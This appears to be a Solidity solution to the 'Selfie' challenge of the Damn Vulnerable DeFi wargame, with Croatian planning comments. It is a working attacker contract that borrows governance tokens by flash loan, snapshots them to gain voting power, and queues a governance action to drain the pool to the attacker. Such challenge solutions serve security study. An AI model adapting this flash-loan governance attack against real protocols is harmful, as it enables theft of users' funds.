// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";

interface ISelfiePoolPool {
    function flashLoan(uint256 amount) external;
}

interface IGovernance {
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external payable;
}
//PLAN
//1. UZMI FLASH LOAN U SELFIE POOL -> selfie pool nam daje DVT token koji je isti kao i governance token 
//-> da bi dobili pravo za izvodit governance akciju treba nam >50% ukupne kolicine tokena -> UKUPAN broj je 2 milijuna-> uzimamo 1000001 DVT token
//TOKENI NAM TREBAJU SAMO ZA PROPOSAT AKCIJU-> ZA IZVEST TREBA SAMO PROC ROK I DA NAM JE TO PRVI PUT
//2. Predlozi akciju na governance -> receiver ce bit selfiepoola fukcija koju ce executat ce bit drainAllFunds s paraemtrom receiver postavljenim na OWNERA CONTRACTA DIREKTNO, weiAmmount stavljamo na 0 JER NEMA CONTRACT ETH
//3. Sacekaj 2 dana -> to radimo u js s ethers.js
//4. Pozovi executeAction -> NOVA TRANSAKCIJA NAKON CEKANJA

contract DrainSelfiePool {

    address internal owner;
    address internal governance;
    address internal selfiePool; 
    uint256 internal governanceActionId;

    constructor(address governanceAddress, address selfiePoolAddress)
    {
        owner=msg.sender;
        governance=governanceAddress;
        selfiePool=selfiePoolAddress;
    }

    function proposeGovernanceAction(uint256 TOKEN_INITIAL_SUPPLY) external {
        require(msg.sender==owner,"Only owner can call this function");
        ISelfiePoolPool(selfiePool).flashLoan(TOKEN_INITIAL_SUPPLY/2+1);
    }

    //poziv funkcije kod flashLoan poziva na selfiePool contractu
    function receiveTokens(address tokenAddress, uint256 borrowAmmount) external {
        require(DamnValuableTokenSnapshot(tokenAddress).balanceOf(address(this))==borrowAmmount,"Greska trasnfera");
        //predlozi akciju u governance contractu -> postavi parametre funckije u calldata parametru
        //naprai snapshot tokena kad priimo tokene
        DamnValuableTokenSnapshot(tokenAddress).snapshot();//važno-> potrebno napravit snapshot jer se u governance gleda zadnji snapshot a mi zelimo da se gleda snapshot u kojem mi imamo posudene tokene
        //S OBIZROM NA OVAJ NAJNOVIJI SNAPSHOT SE ODREDUJU ODREDUJU VOTING PRAVA
        governanceActionId=IGovernance(governance).queueAction(selfiePool,abi.encodeWithSignature("drainAllFunds(address)",owner),0);
        //vrati flash loan
        DamnValuableTokenSnapshot(tokenAddress).transfer(selfiePool,borrowAmmount);
    }

    function drainPool() external{
        IGovernance(governance).executeAction(governanceActionId);
    }
}
